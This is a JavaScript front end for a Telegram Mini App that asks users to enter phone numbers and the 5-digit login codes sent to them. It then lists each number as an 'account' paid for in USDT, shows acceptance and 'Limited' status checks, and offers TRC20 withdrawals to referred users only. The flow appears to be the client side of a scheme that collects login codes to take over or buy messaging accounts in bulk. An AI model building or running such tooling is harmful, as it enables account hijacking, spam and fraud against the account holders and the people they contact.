const kingstar = Telegram.WebApp;
const mainButton = kingstar.MainButton;
const backButton = kingstar.BackButton;

const allPages = document.querySelectorAll(".page");
const loadingPage = document.getElementById("loading-page");
const mainPage = document.getElementById("main-page");
const acctsPage = document.getElementById("accts-page");
const withdrawalPage = document.getElementById("withdraw-page");
const numberPage = document.getElementById("number-page");
const codePage = document.getElementById("code-page");
const hisDiv = document.querySelector("div.history");
const accountsUl = document.getElementById("accounts-ul");
const statuses = document.querySelectorAll(".status");
const historyLoader = document.querySelector(".his-loader");
const accountPage = document.getElementById("show-account-page");
kingstar.expand();

const showPage = (showPage) => {
  allPages.forEach((p) => (p.style.display = "none"));
  showPage.style.display = "block";
};

const renderAccounts = async (type) => {
  accountsUl.innerHTML = "";
  historyLoader.classList.remove("hidden");

  await new Promise((r) => setTimeout(r, 300));

  const accounts = window.__user.accounts.filter((a) => a.isCompleted === type);
  window.__accounts = accounts;
  hisDiv.classList.remove("hidden");
  historyLoader.classList.add("hidden");

  if (!accounts || accounts.length === 0) return;

  for (const acct of accounts) {
    const {
      id,
      contact: c,
      amount,
      timeStamp,
      isCompleted,
      accountStatus,
    } = acct;

    const contact = `${c.toString().startsWith("+") ? "" : "+"}${c}`;
    acct.contact = contact;

    let timeRemaining = Math.floor(
      (new Date(new Date(timeStamp * 1000).getTime() + 60 * 60 * 24 * 1000) -
        new Date()) /
        1000
    );

    if (timeRemaining <= 0) {
      timeRemaining = "pending";
    } else {
      const hours = String(Math.floor(timeRemaining / 3600)).padStart(2, "0");
      timeRemaining %= 3600;
      const minutes = String(Math.floor(timeRemaining / 60)).padStart(2, "0");
      const seconds = String(timeRemaining % 60).padStart(2, "0");
      timeRemaining = `${hours}:${minutes}:${seconds}`;
    }

    const node = document.createElement("li");
    node.className =
      "list-item-anim group relative bg-white rounded-[2rem] p-5 shadow-sm border border-slate-100 hover:shadow-md transition-all active:scale-[0.99]";
    node.innerHTML = `

              <div class="flex items-center justify-between mb-4">
                <div class="flex items-center gap-3">
                  <div
                    class="h-10 w-10 rounded-xl bg-slate-50 flex items-center justify-center text-slate-600"
                  >
                    <svg
                      xmlns="http://www.w3.org/2000/svg"
                      viewBox="0 0 24 24"
                      fill="currentColor"
                      class="w-5 h-5"
                    >
                      <path
                        d="M10.5 18.75a.75.75 0 0 0 0 1.5h3a.75.75 0 0 0 0-1.5h-3Z"
                      />
                      <path
                        fill-rule="evenodd"
                        d="M7.125 2.25A2.625 2.625 0 0 0 4.5 4.875v14.25A2.625 2.625 0 0 0 7.125 21.75h9.75a2.625 2.625 0 0 0 2.625-2.625V4.875A2.625 2.625 0 0 0 16.875 2.25h-9.75ZM6 4.875c0-.621.504-1.125 1.125-1.125h9.75c.621 0 1.125.504 1.125 1.125v14.25c0 .621-.504 1.125-1.125 1.125h-9.75A1.125 1.125 0 0 1 6 19.125V4.875Z"
                        clip-rule="evenodd"
                      />
                    </svg>
                  </div>
                  <div>
                    <p class="text-sm font-bold text-slate-800 tracking-tight">
                      ${contact}
                    </p>
                    <p
                      class="text-[11px] font-mono text-indigo-500 font-semibold"
                    >
                      ${amount == 0 ? amount.toFixed(2) : amount} USDT
                    </p>
                  </div>
                </div>

                <button
                  class="p-2 text-slate-300 hover:text-indigo-500 transition-colors"
                >
                  <svg
                    xmlns="http://www.w3.org/2000/svg"
                    fill="none"
                    viewBox="0 0 24 24"
                    stroke-width="2"
                    stroke="currentColor"
                    class="w-5 h-5"
                  >
                    <path
                      stroke-linecap="round"
                      stroke-linejoin="round"
                      d="M13.5 6H5.25A2.25 2.25 0 0 0 3 8.25v10.5A2.25 2.25 0 0 0 5.25 21h10.5A2.25 2.25 0 0 0 18 18.75V10.5m-10.5 6L21 3m0 0h-5.25M21 3v5.25"
                    />
                  </svg>
                </button>
              </div>

              <div class="flex flex-wrap gap-2">

                ${
                  isCompleted === "pending"
                    ? `<span
                  class="px-3 py-1 rounded-full bg-amber-50 text-amber-600 text-[10px] font-bold uppercase tracking-wider border border-amber-100"
                >
                  Pending
                </span>`
                    : isCompleted === "accepted"
                    ? `<span
                  class="px-3 py-1 rounded-full bg-emerald-50 text-emerald-600 text-[10px] font-bold uppercase tracking-wider border border-emerald-100"
                >
                  Accepted
                </span>`
                    : `<span
                  class="px-3 py-1 rounded-full bg-red-50 text-red-600 text-[10px] font-bold uppercase tracking-wider border border-red-100"
                >
                  Rejected
                </span>`
                }

                ${
                  accountStatus === "pending"
                    ? `<span
                  class="px-3 py-1 rounded-full bg-amber-50 text-amber-600 text-[10px] font-bold uppercase tracking-wider border border-amber-100"
                >
                  Pending
                </span>`
                    : accountStatus === "free"
                    ? `<span
                  class="px-3 py-1 rounded-full bg-emerald-50 text-emerald-600 text-[10px] font-bold uppercase tracking-wider border border-emerald-100"
                >
                  Free
                </span>`
                    : `<span
                  class="px-3 py-1 rounded-full bg-red-50 text-red-600 text-[10px] font-bold uppercase tracking-wider border border-red-100"
                >
                  Limited
                </span>`
                }

                <span
                  class="px-3 py-1 rounded-full bg-slate-100 text-slate-500 text-[10px] font-mono font-bold border border-slate-200 ml-auto"
                >
                  ${timeRemaining}
                </span>
              </div>
`;

    node.onclick = (e) => {
      showAccount(accounts.find((a) => a.id === id));
    };
    accountsUl.appendChild(node);
  }
};

const showAccount = (obj) => {
  const getIt = window.getShort;
  if (!getIt) {
    return alert("Resources not ready. Re-try now!");
  }

  const stateHouse = {
    pending: (t1, t2, t3, t4) => `
<div class="bg-white p-5 rounded-3xl border border-slate-100 shadow-sm flex items-start gap-4">
  <div class="h-12 w-12 rounded-2xl bg-amber-50 flex items-center justify-center shrink-0">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" class="w-6 h-6 text-amber-500">
      <path fill-rule="evenodd" d="M12 2.25c-5.385 0-9.75 4.365-9.75 9.75s4.365 9.75 9.75 9.75 9.75-4.365 9.75-9.75S17.385 2.25 12 2.25ZM12.75 6a.75.75 0 0 0-1.5 0v6c0 .414.336.75.75.75h4.5a.75.75 0 0 0 0-1.5h-3.75V6Z" clip-rule="evenodd" />
    </svg>
  </div>
  <div class="flex-1">
    <div class="flex justify-between items-center mb-1">
      <h3 class="text-xs font-bold uppercase tracking-widest text-slate-400">${t1}</h3>
      <span class="text-[10px] font-bold text-amber-600 bg-amber-50 px-2 py-0.5 rounded-md">${t2}</span>
    </div>
    <p class="text-sm font-bold text-slate-700">${t3}</p>
    <p class="text-xs text-slate-400 mt-1">${t4}</p>
  </div>
</div>
`,
    completed: (t1, t2, t3, t4) => `
<div class="bg-white p-5 rounded-3xl border border-slate-100 shadow-sm flex items-start gap-4">
  <div class="h-12 w-12 rounded-2xl bg-emerald-50 flex items-center justify-center shrink-0">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" class="w-6 h-6 text-emerald-500">
      <path fill-rule="evenodd" d="M12 2.25c-5.385 0-9.75 4.365-9.75 9.75s4.365 9.75 9.75 9.75 9.75-4.365 9.75-9.75S17.385 2.25 12 2.25Zm3.53 7.28a.75.75 0 0 0-1.06-1.06l-3.97 3.97-1.47-1.47a.75.75 0 1 0-1.06 1.06l2 2a.75.75 0 0 0 1.06 0l4.5-4.5Z" clip-rule="evenodd" />
    </svg>
  </div>
  <div class="flex-1">
    <div class="flex justify-between items-center mb-1">
      <h3 class="text-xs font-bold uppercase tracking-widest text-slate-400">${t1}</h3>
      <span class="text-[10px] font-bold text-emerald-600 bg-emerald-50 px-2 py-0.5 rounded-md">${t2}</span>
    </div>
    <p class="text-sm font-bold text-slate-700">${t3}</p>
    <p class="text-xs text-slate-400 mt-1">${t4}</p>
  </div>
</div>
`,
    bad: (t1, t2, t3, t4) => `
<div class="bg-white p-5 rounded-3xl border border-slate-100 shadow-sm flex items-start gap-4">
  <div class="h-12 w-12 rounded-2xl bg-red-50 flex items-center justify-center shrink-0">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" class="w-6 h-6 text-red-500">
      <path fill-rule="evenodd" d="M8.603 3.799A4.478 4.478 0 0 1 12 2.25c1.358 0 2.58.601 3.397 1.549a4.49 4.49 0 0 1 3.498 1.307 4.491 4.491 0 0 1 1.307 3.497A4.478 4.478 0 0 1 21.75 12a4.478 4.478 0 0 1-1.549 3.397 4.491 4.491 0 0 1-1.307 3.497 4.491 4.491 0 0 1-3.497 1.307A4.478 4.478 0 0 1 12 21.75a4.478 4.478 0 0 1-3.397-1.549 4.49 4.49 0 0 1-3.498-1.306 4.491 4.491 0 0 1-1.307-3.498A4.478 4.478 0 0 1 2.25 12c0-1.357.601-2.58 1.549-3.397a4.49 4.49 0 0 1 1.307-3.497 4.49 4.49 0 0 1 3.497-1.307Zm7.007 6.387a.75.75 0 1 0-1.22-.872l-3.236 4.53L9.53 12.22a.75.75 0 0 0-1.06 1.06l2.25 2.25a.75.75 0 0 0 1.14-.094l3.75-5.25Z" clip-rule="evenodd" />
    </svg>
  </div>
  <div class="flex-1">
    <div class="flex justify-between items-center mb-1">
      <h3 class="text-xs font-bold uppercase tracking-widest text-slate-400">${t1}</h3>
      <span class="text-[10px] font-bold text-red-600 bg-red-50 px-2 py-0.5 rounded-md">${t2}</span>
    </div>
    <p class="text-sm font-bold text-slate-700">${t3}</p>
    <p class="text-xs text-slate-400 mt-1">${t4}</p>
  </div>
</div>
`,
  };
  const { id, contact, amount, isCompleted, accountStatus, accountStatusText } =
    obj;

  const div = `
    <main class="flex min-h-screen flex-col bg-[#f8fafc] font-sans antialiased text-slate-900">

      <header class="hidden sticky top-0 z-50 backdrop-blur-md bg-white/70 border-b border-slate-200/60 px-6 py-4 flex items-center justify-between">
        <div class="flex items-center gap-3">
          <button onclick="accountPage.style.display='none'; acctsPage.style.display='block';" class="p-2 hover:bg-slate-100 rounded-full transition-colors">
            <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" class="w-5 h-5 text-slate-600">
              <path stroke-linecap="round" stroke-linejoin="round" d="M10.5 19.5 3 12m0 0 7.5-7.5M3 12h18" />
            </svg>
          </button>
          <h1 class="text-lg font-bold tracking-tight text-slate-800">Account Details</h1>
        </div>
        <button class="text-rose-500 p-2 hover:bg-rose-50 rounded-full transition-colors">
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" class="w-5 h-5">
            <path fill-rule="evenodd" d="M16.5 4.478v.227a48.816 48.816 0 0 1 3.878.512.75.75 0 1 1-.256 1.478l-.209-.035-1.005 13.07a3 3 0 0 1-2.991 2.77H8.084a3 3 0 0 1-2.991-2.77L4.087 6.66l-.209.035a.75.75 0 0 1-.256-1.478A48.567 48.567 0 0 1 7.5 4.705v-.227c0-1.564 1.213-2.9 2.816-2.9h3.368c1.603 0 2.816 1.336 2.816 2.9Zm-6.522 2.25a.75.75 0 0 0-.75.75v7.906a.75.75 0 0 0 1.5 0V7.478a.75.75 0 0 0-.75-.75Zm3.22 0a.75.75 0 0 0-.75.75v7.906a.75.75 0 0 0 1.5 0V7.478a.75.75 0 0 0-.75-.75Z" clip-rule="evenodd" />
          </svg>
        </button>
      </header>

      <div class="px-5 py-6 space-y-6">

        <div class="bg-white rounded-[2.5rem] p-6 shadow-sm border border-slate-100 flex flex-col items-center text-center">
          <div class="relative mb-4">
            <div class="h-20 w-20 rounded-full bg-slate-50 border-4 border-white shadow-md overflow-hidden flex items-center justify-center">
              <img class="h-10 w-10 object-cover" src="https://flagcdn.com/${getIt(
                contact
              )}.svg" alt="flag" />
            </div>
            <div class="absolute -bottom-1 -right-1 bg-emerald-500 border-2 border-white h-5 w-5 rounded-full"></div>
          </div>
          <h2 class="text-xl font-black text-slate-800">${contact}</h2>
          <p class="text-sm font-bold text-indigo-500 mt-1">${
            amount == 0 ? amount.toFixed(2) : amount
          } USDT</p>
          <p class="text-[10px] font-mono text-slate-400 mt-2 bg-slate-50 px-3 py-1 rounded-full border border-slate-100">ID: ${id}</p>
        </div>

        <div class="grid gap-4">

        ${
          isCompleted === "pending"
            ? stateHouse.pending(
                "Acceptance Status",
                "Pending",
                "Account is pending for validation",
                "Usually takes 6-12 hours"
              )
            : isCompleted === "accepted"
            ? stateHouse.completed(
                "Acceptance Status",
                "Accepted",
                "Account accepted",
                `${amount} USDT has been added to your balance.`
              )
            : stateHouse.bad(
                "Acceptance Status",
                "Rejected",
                "Account is rejected",
                "Unfortunately, this account has been rejected."
              )
        }
        
        ${
          accountStatus === "pending"
            ? stateHouse.pending(
                "Limit Status",
                "Pending",
                "Account is awaiting status checks",
                "Usually takes 1-6 hours"
              )
            : accountStatus === "free"
            ? stateHouse.completed(
                "Limit Status",
                "Free",
                "No account restrictions",
                "Account is free and ready for use"
              )
            : stateHouse.bad(
                "Limit Status",
                "Limited",
                "Account is limited",
                accountStatusText
              )
        }

        </div>

      </div>
    </main>
  `;
  accountPage.innerHTML = div;
  acctsPage.style.display = "none";
  accountPage.style.display = "block";
};

const renderId = (id, content, type) =>
  (document.getElementById(id)[type ? type : "innerHTML"] = content);
const renderClass = (className, content, type) =>
  document
    .querySelectorAll(`.${className}`)
    .forEach((el) => (el[type ? type : "innerHTML"] = content));

const mainButtonFunc = async () => {
  if (window.__c === 0) {
    showPage(numberPage);
    mainButton.setText("Continue");
    window.__c += 1;
    return;
  }
  if (window.__c === 1) {
    mainButton.showProgress();

    const input = document.querySelector("#phone");
    const phoneNumber = input.value.trim();
    const err = document.querySelector("#phone-error");
    const errText = document.querySelector("#phone-error-text");

    if (
      !phoneNumber ||
      phoneNumber === "" ||
      phoneNumber.length < 11 ||
      phoneNumber.length > 15 ||
      isNaN(phoneNumber)
    ) {
      errText.innerHTML = "Invalid phne number";
      err.classList.remove("hidden");
      mainButton.hideProgress();
      return;
    }
    err.classList.add("hidden");
    const response = await fetch(`/get-code?phone=${phoneNumber}`);
    mainButton.hideProgress();

    if (!response.ok) {
      errText.innerHTML = "An error occured. Try again later!";
      err.classList.remove("hidden");
      return;
    }
    const data = await response.json();
    if (!data.success || !data.req_id) {
      errText.innerHTML = data.error;
      err.classList.remove("hidden");
      return;
    }
    window.__code_id = data.req_id;
    input.value = "";
    document.getElementById("display-phone").innerHTML = "+" + phoneNumber;
    mainButton.hideProgress();
    showPage(codePage);
    window.__c += 1;
    return;
  }
  if (window.__c === 2) {
    mainButton.showProgress();
    const input = document.querySelector("#code");
    const code = input.value.trim();
    const err = document.querySelector("#code-error");
    if (!code || code === "" || code.length != 5 || isNaN(code)) {
      err.innerHTML = "Please enter a valid OTP code";
      err.classList.remove("hidden");
      mainButton.hideProgress();
      return;
    }
    err.classList.add("hidden");
    const response = await fetch(`/verify-code`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        req_id: window.__code_id,
        code,
      }),
    });
    mainButton.hideProgress();
    if (!response.ok) {
      err.innerHTML = "An error occured. Try again later!";
      err.classList.remove("hidden");
      return;
    }
    const data = await response.json();
    if (!data.success) {
      err.innerHTML = data.error;
      err.classList.remove("hidden");
      return;
    }
    window.__user.accounts.push(data.account);
    input.value = "";
    window.__code_id = null;
    renderId("total_accounts", window.__user.accounts.length);
    mainButton.hideProgress();
    backButtonFunc();
    return;
  }
};

const backButtonFunc = () => {
  showPage(mainPage);
  backButton.offClick(this);
  backButton.hide();
  mainButton.offClick(mainButtonFunc);
  mainButton.hide();
  window.__c = 0;
};

document.getElementById("send_accts")?.addEventListener("click", () => {
  window.__c = 0;
  statuses.forEach((s) => s.classList.remove("active"));
  statuses[0].classList.add("active");
  showPage(acctsPage);
  renderAccounts("pending");
  mainButton.hideProgress();
  mainButton.setText("Login");
  mainButton.show();
  backButton.show();
  mainButton.onClick(mainButtonFunc);
  backButton.onClick(backButtonFunc);
});

document.getElementById("send_money")?.addEventListener("click", () => {
  showPage(withdrawalPage);
  backButton.show();
  backButton.onClick(backButtonFunc);
});

statuses.forEach((status) => {
  status.addEventListener("click", (e) => {
    statuses.forEach((s) => s.classList.remove("active"));
    const { currentTarget } = e;
    let t = currentTarget.textContent.trim();
    currentTarget.classList.add("active");
    renderAccounts(t.toLowerCase());
  });
});

document.getElementById("orders__")?.addEventListener("click", () =>
  kingstar.showPopup({
    title: "Message",
    message: "Coming soon...",
    buttons: [
      {
        type: "destructive",
        text: "Close",
      },
    ],
  })
);
document.getElementById("user_id")?.addEventListener("touchstart", (e) => {
  kingstar.HapticFeedback.impactOccurred("heavy");
  this.classList.add("blue");
});
document.getElementById("user_id")?.addEventListener("touchend", () => {
  this.classList.remove("blue");
});

document
  .getElementById("confirm_withdraw")
  ?.addEventListener("click", async function () {
    this.disabled = true;
    this.innerHTML = "Processing...";
    const address = document.getElementById("withdraw_address").value.trim();
    const amount = document.getElementById("withdraw_amount").value.trim();

    if (!address || address == "" || address.length < 30) {
      this.innerHTML = "Confirm Withdrawal";
      this.disabled = false;
      kingstar.showPopup({
        title: "Withdraw error",
        message: "Please enter a valid TRC20 address",
      });
      return;
    }
    if (!amount || amount == "" || isNaN(amount)) {
      this.innerHTML = "Confirm Withdrawal";
      this.disabled = false;
      kingstar.showPopup({
        title: "Withdraw error",
        message: "Please enter a valid withdrawal amount",
      });
      return;
    }
    if (amount < 10) {
      this.innerHTML = "Confirm Withdrawal";
      this.disabled = false;
      kingstar.showPopup({
        title: "Withdraw error",
        message: "Minimum withdrawal amount is 10 USDT",
      });
      return;
    }
    let balance = window.__user.balance || 0;
    if (amount > balance) {
      this.innerHTML = "Confirm Withdrawal";
      this.disabled = false;
      kingstar.showPopup({
        title: "Withdraw error",
        message: "Maximum withdrawal amount is " + balance + " USDT",
      });
      return;
    }
    const response = await fetch("/withdraw", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        address,
        amount,
      }),
    });
    if (!response.ok) {
      this.innerHTML = "Confirm Withdrawal";
      this.disabled = false;
      kingstar.showPopup({
        title: "Withdraw error",
        message: "An error occured. Try again later!",
      });
      return;
    }
    const data = await response.json();
    if (!data.success) {
      this.innerHTML = "Confirm Withdrawal";
      this.disabled = false;
      kingstar.showPopup({
        title: "Withdraw error",
        message: data.error,
      });
      return;
    }
    this.innerHTML = "Confirm Withdrawal";
    this.disabled = false;
    kingstar.showPopup({
      title: "Withdraw success",
      message: "Withdrawal request has been successfully proccessed!",
    });
    balance -= amount;
    window.__user.balance = balance;
    renderClass(
      "balance",
      balance.toLocaleString("en-us", {
        minimumFractionDigits: 2,
        maximumFractionDigits: 2,
      })
    );
  });

const renderUser = () => {
  const user = window.__user;
  if (!user) return alert("User not found to render!");
  const { balance, accounts } = user;
  const { id, first_name, last_name, username, photo_url } = user.userDetails;
  renderId("dp", photo_url, "src");
  renderId("user_id", `AccountID: ${id}`);
  renderId("name", `${first_name} ${last_name}`);
  renderClass(
    "balance",
    balance.toLocaleString("en-us", {
      minimumFractionDigits: 2,
      maximumFractionDigits: 2,
    })
  );
  renderId("total_accounts", accounts.length);
};

const initApp = async () => {
  try {
    const initData = kingstar.initData;
    const response = await fetch("/me", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({ initData }),
    });
    if (!response.ok) {
      alert("Error fetching user data");
      return;
    }
    const data = await response.json();
    if (!data.success) {
      if (data.error === "No upline") {
        kingstar.showPopup({
          title: "Join Notice",
          message:
            "🥲 Currently, only users with a referral link can access this Bot. Please ask with your referrer for link to continue.",
          buttons: [
            {
              type: "destructive",
              text: "Cancel",
            },
          ],
        });
        await kingstar.close();
        return;
      }
      if (data.error === "Invalid upline") {
        kingstar.showPopup({
          title: "Invalid Upline",
          message: "🥲 Sorry, your referrer link is not valid!",
          buttons: [
            {
              type: "destructive",
              text: "Cancel",
            },
          ],
        });
        await kingstar.close();
        return;
      }
      alert(data.error);
      return;
    }
    data.user.userDetails = kingstar?.initDataUnsafe?.user;
    window.__user = data.user;
    renderUser();
    loadingPage.style.display = "none";
    mainPage.style.display = "block";
  } catch (e) {
    alert(e.message);
  }
};

setInterval(() => {
  const isPhoneDark = window.matchMedia("(prefers-color-scheme: dark)").matches;
  if (isPhoneDark) {
    document.body.classList.add("dark");
  } else {
    document.body.classList.remove("dark");
  }
}, 100);

if (kingstar.initData) {
  initApp();
}
